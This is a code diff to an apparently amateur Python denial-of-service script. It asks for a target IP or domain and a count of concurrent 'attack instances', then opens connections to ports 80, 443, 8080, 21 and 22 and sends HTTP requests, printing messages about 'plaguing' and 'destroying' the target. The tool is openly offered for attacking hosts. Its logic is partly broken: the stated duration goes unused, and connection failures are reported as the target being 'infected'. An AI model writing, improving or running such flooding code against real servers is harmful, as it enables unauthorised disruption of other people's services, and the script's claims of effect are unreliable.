@@ -1,6 +1,8 @@
 import asyncio
 import os
 import subprocess
+import socket
+import time
 from typing import Dict, Tuple
 
 class bcolors:
@@ -32,12 +34,6 @@ class CustomTCPProtocol(asyncio.Protocol):
             dest[1].release()
         self.destinations.clear()
 
-    def send_data(self, dest: Tuple[str, int], data: bytes):
-        if not dest[0].empty():
-            dest[1].acquire()
-            dest[0].put_nowait(data)
-            dest[1].release()
-
     def add_destination(self, dest: Tuple[str, int]):
         if dest not in self.destinations:
             self.destinations[dest] = (asyncio.Queue(), asyncio.Semaphore())
@@ -56,32 +52,35 @@ async def attack(target: str, duration_minutes: int, attack_count: int, progress
     duration_seconds = duration_minutes * 60
     tasks = []
 
-    for _ in range(attack_count):
-        transport, protocol = await asyncio.get_running_loop().create_connection(lambda: CustomTCPProtocol(), target, 0)
-
+    async def attack_port(port: int):
         try:
-            ports = [80, 443, 8080, 21, 22]
-            for port in ports:
-                print(f"{bcolors.OKBLUE}Sending data to {target}:{port}{bcolors.ENDC}")
-                protocol.add_destination((target, port))
-                transport.write(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(1)  # Set a timeout for the connection
+                s.connect((target, port))
+                start = time.time()
+                
+                if port == 80:
+                    s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
+                elif port == 443:
+                    s.send(b"POST / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
+                else:
+                    s.send(b"GET / HTTP/1.1\r\n\r\n")
+                
+                s.recv(1024)  # Receive response
+                end = time.time()
+                ping = round((end - start) * 1000, 2)
+                print(bcolors.OKGREEN + f"Successfully started to plague {target}:{port}! 🤢🦠 Attempting to destroy | Ping: {ping}ms{bcolors.ENDC}")
+                progress_queue.put_nowait(1)  # Indicate a request was sent
 
-            end_time = asyncio.get_running_loop().time() + duration_seconds
-            while asyncio.get_running_loop().time() < end_time:
-                for dest in protocol.destinations.keys():
-                    for _ in range(10):  # Increase the number of requests sent
-                        tasks.append(asyncio.create_task(protocol.send_data(protocol.destinations[dest],
-                            f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())))
-                        progress_queue.put_nowait(1)
+        except Exception as e:
+            print(bcolors.FAIL + f"IP/WEBSITE COULD BE FULLY INFECTED🟥: {e}{bcolors.ENDC}")
 
-                await asyncio.sleep(0.1)
+    for _ in range(attack_count):
+        for port in [80, 443, 8080, 21, 22]:  # Specify ports to attack
+            task = asyncio.create_task(attack_port(port))
+            tasks.append(task)
 
-            await asyncio.gather(*tasks)
-            print(f"{bcolors.OKGREEN}Attack instance completed.{bcolors.ENDC}")
-        finally:
-            transport.close()
-
-    print(f"{bcolors.OKGREEN}All attack instances completed.{bcolors.ENDC}")
+    await asyncio.wait(tasks)
 
 async def countdown(duration_seconds: int):
     for remaining in range(duration_seconds, 0, -1):
@@ -114,7 +113,7 @@ async def main():
     target = input(f"{bcolors.HEADER}Enter the target IP or domain: {bcolors.ENDC}")
     attack_count = int(input(f"{bcolors.HEADER}Enter the number of concurrent attack instances: {bcolors.ENDC}"))
     
-    total_requests = attack_count * 10 * duration_minutes * 60  # Estimate total requests
+    total_requests = attack_count * 5 * duration_minutes * 60  # Estimate total requests
     print(f"{bcolors.OKGREEN}Attacking {target} for {duration_minutes} minutes with {attack_count} instances...{bcolors.ENDC}")
 
     progress_queue = asyncio.Queue()
